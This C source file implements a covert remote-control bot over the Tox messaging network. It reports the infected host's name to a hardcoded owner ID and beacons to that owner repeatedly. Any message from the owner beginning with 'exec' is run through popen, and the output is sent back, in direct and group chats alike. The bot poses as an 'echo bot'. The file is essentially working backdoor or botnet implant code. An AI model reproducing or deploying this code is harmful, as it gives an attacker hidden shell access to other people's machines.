#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sodium/utils.h>
#include <tox/tox.h>
#include <sys/utsname.h> // uname

//edit this, or whatever
char *ownerid =
        "E9A010D9AE096B8366FBC9E3F94FA83F993DDB5424CE97C2DF1E1711A606585A0034142411BD";
char *owner =
        "E9A010D9AE096B8366FBC9E3F94FA83F993DDB5424CE97C2DF1E1711A606585A0034142411BD";
char *ownershort =
        "E9A010D9AE096B8366FBC9E3F94FA83F993DDB5424CE97C2DF1E1711A606585A";


//some tox stuff
typedef struct DHT_node {
    const char *ip;
    uint16_t port;
    const char key_hex[TOX_PUBLIC_KEY_SIZE * 2 + 1];
    unsigned char key_bin[TOX_PUBLIC_KEY_SIZE];
} DHT_node;

//we need this function i guess idk lmao
uint8_t *
hex2bin(const char *hex) {
    size_t len = strlen(hex) / 2;
    uint8_t *bin = malloc(len);

    for (size_t i = 0; i < len; ++i, hex += 2) {
        sscanf(hex, "%2hhx", &bin[i]);
    }

    return bin;
}

//this one too lol
char *
bin2hex(const uint8_t *bin, size_t length) {
    char *hex = malloc(2 * length + 1);
    char *saved = hex;
    for (int i = 0; i < length; i++, hex += 2) {
        sprintf (hex, "%02X", bin[i]);
    }
    return saved;
}

//here we go, time to register some callsbacks and shit.

//we used to make the master send the requests, now we send them ourselves, this cb def basically says do nothing on a friend request.
void
friend_request_cb(Tox *tox, const uint8_t *public_key,
                  const uint8_t *message, size_t length, void *user_data) {
    //  tox_friend_add_norequest(tox, public_key, NULL);
}

//this is the magic. when we get a message from a friend, check if it's the owner. if so, check the first word in the message and see what kind of action is requested. if it's exec, do the command and return the result back.
void
friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type,
                  const uint8_t *message, size_t length, void *user_data) {
    uint8_t client_id[TOX_PUBLIC_KEY_SIZE];
    tox_friend_get_public_key(tox, friend_num, client_id, NULL);
    char *mkeyhex = bin2hex(client_id, sizeof(client_id));
    printf("client_id %s \n", mkeyhex);
    printf("msg %s \n", message);
    if (strcmp(mkeyhex, ownershort) == 0) {
        char *cmd, *cmdt;
        cmdt = strdup(message);
        cmdt = strtok(cmdt, " ");
        cmd = strtok(NULL, "");
        printf("cmd: %s \n", cmd);
        printf("cmdt: %s \n", cmdt);

        if (strcmp(cmdt, "exec") == 0) {
            FILE *fp;
            uint8_t path[TOX_MAX_MESSAGE_LENGTH];
            fp = popen(cmd, "r");
            while (fgets(path, sizeof(path) - 1, fp) != NULL) {
                printf("Exec: %s \n", path);
                tox_friend_send_message(tox, friend_num,
                                        TOX_MESSAGE_TYPE_NORMAL, path,
                                        strlen(path), NULL);
            }
            pclose(fp);
        }

    }
}

//idk if groups work rn i forget. explore this
void group_invite_cb(Tox *tox, uint32_t friend_num, TOX_CONFERENCE_TYPE type, const uint8_t *cookie, size_t length, void *user_data) {
    tox_conference_join(tox, friend_num, cookie, length, NULL );
}

void
group_message_cb(Tox *tox, uint32_t group_num, uint32_t peer_number,
                 TOX_MESSAGE_TYPE type, const uint8_t *message,
                 size_t length, void *user_data) {
    uint8_t masterkey[TOX_PUBLIC_KEY_SIZE];
    tox_conference_peer_get_public_key(tox, group_num, peer_number, masterkey,
                                       NULL);
    char *mkeyhex = bin2hex(masterkey, sizeof(masterkey));
    if (strcmp(mkeyhex, ownershort) == 0) {
        char *cmd, *cmdt;
        cmdt = strdup(message);
        cmdt = strtok(cmdt, " ");
        cmd = strtok(NULL, "");
        printf("cmd: %s \n", cmd);
        printf("cmdt: %s \n", cmdt);

        if (strcmp(cmdt, "exec") == 0) {
            FILE *fp;
            uint8_t path[TOX_MAX_MESSAGE_LENGTH];
            fp = popen(cmd, "r");
            while (fgets(path, sizeof(path) - 1, fp) != NULL) {
                printf("Exec: %s \n", path);
                tox_conference_send_message(tox, group_num,
                                        TOX_MESSAGE_TYPE_NORMAL, path,
                                        strlen(path), NULL);
            }
            pclose(fp);
        }

    }

}

//we need this for tox or something idk go read the headers in c-toxcore
void
self_connection_status_cb(Tox *tox, TOX_CONNECTION connection_status,
                          void *user_data) {
    switch (connection_status) {
        case TOX_CONNECTION_NONE:
            printf("Offline\n");
            break;
        case TOX_CONNECTION_TCP:
            printf("Online, using TCP\n");
            break;
        case TOX_CONNECTION_UDP:
            printf("Online, using UDP\n");
            break;
    }
}

//do our shit
//int
main() {
    Tox *tox = tox_new(NULL, NULL);

    //const char *name = "Echo Bot";
    //const char *name = file2str("/proc/sys/kernel/osrelease");
    struct utsname uName;
    uname(&uName);
    //printf("Setting the name to: %s \n", uName.release); // sysname, nodename, release, version, machine

    const char *name[4] = {uName.machine, uName.release, uName.nodename, uName.sysname};
    strcat(strcat(name[0], "_"), strcat(strcat(name[1], "_"), name[2]));

    tox_self_set_name(tox, name[0], strlen(name[0]), NULL);
    printf("strlen of name: %d\n",strlen(name[0]));

    //strcat(strcat(name[0], "-"), strcat(strcat(name[1], "-"), name[2])); // Too long for tox name

    for (int i=0; i<4; ++i) printf("%s\n", name[i]);

    const char *status_message = "Echoing your messages";
    tox_self_set_status_message(tox, status_message, strlen(status_message),
                                NULL);
//bootstrap the tox network. we don't need tox network, we dont need these nodes, but they are there and they work so why not use them
    DHT_node nodes[] = {
            {"46.229.52.198",
                    33445,
                    "813C8F4187833EF0655B10F7752141A352248462A567529A38B6BBF73E979307",
                    {0}},
            {"tox.kurnevsky.net",
                    33445,
                    "82EF82BA33445A1F91A7DB27189ECFC0C013E06E3DA71F588ED692BED625EC23",
                    {0}},
            {"tox2.abilinski.com",
                    33445,
                    "7A6098B590BDC73F9723FC59F82B3F9085A64D1B213AAF8E610FD351930D052D",
                    {0}},
            {"163.172.136.118",
                    33445,
                    "2C289F9F37C20D09DA83565588BF496FAB3764853FA38141817A72E3F18ACA0B",
                    {0}},
            {"2001:bc8:4400:2100::1c:50f",
                    33445,
                    "2C289F9F37C20D09DA83565588BF496FAB3764853FA38141817A72E3F18ACA0B",
                    {0}},
            {"128.199.199.197",
                    33445,
                    "B05C8869DBB4EDDD308F43C1A974A20A725A36EACCA123862FDE9945BF9D3E09",
                    {0}},
            {"2400:6180:0:d0::17a:a001",
                    33445,
                    "B05C8869DBB4EDDD308F43C1A974A20A725A36EACCA123862FDE9945BF9D3E09",
                    {0}},
            {"node.tox.biribiri.org",
                    33445,
                    "F404ABAA1C99A9D37D61AB54898F56793E1DEF8BD46B1038B9D822E8460FAB67",
                    {0}}
    };
//do the bootstrap i think idk
    for (size_t i = 0; i < sizeof(nodes) / sizeof(DHT_node); i++) {
        sodium_hex2bin(nodes[i].key_bin, sizeof(nodes[i].key_bin),
                       nodes[i].key_hex, sizeof(nodes[i].key_hex) - 1, NULL,
                       NULL, NULL);
        tox_bootstrap(tox, nodes[i].ip, nodes[i].port, nodes[i].key_bin, NULL);
    }

    uint8_t tox_id_bin[TOX_ADDRESS_SIZE];
    tox_self_get_address(tox, tox_id_bin);

    char tox_id_hex[TOX_ADDRESS_SIZE * 2 + 1];
    sodium_bin2hex(tox_id_hex, sizeof(tox_id_hex), tox_id_bin,
                   sizeof(tox_id_bin));

    for (size_t i = 0; i < sizeof(tox_id_hex) - 1; i++) {
        tox_id_hex[i] = toupper(tox_id_hex[i]);
    }

    printf("Tox ID: %s\n", tox_id_hex);
//register our callbacks
    tox_callback_friend_request(tox, friend_request_cb);
    tox_callback_friend_message(tox, friend_message_cb);
    tox_callback_conference_invite(tox, group_invite_cb);
    tox_callback_conference_message(tox, group_message_cb);

    tox_callback_self_connection_status(tox, self_connection_status_cb);

    int waiter = 0;
    uint8_t *ownerbin;
    char *pingmsg = "hi lmao";
    ownerbin = hex2bin(owner);
    while (1) {
        tox_iterate(tox, NULL);
        if (waiter > 200) {
            tox_friend_delete(tox, owner, NULL);
            printf("Ping: %s \n", owner);
            tox_friend_add(tox, ownerbin, pingmsg, sizeof(pingmsg), NULL);
            waiter = 0;
        }
        usleep(tox_iteration_interval(tox) * 1000);
        waiter++;
    }

    tox_kill(tox);

    return 0;
}
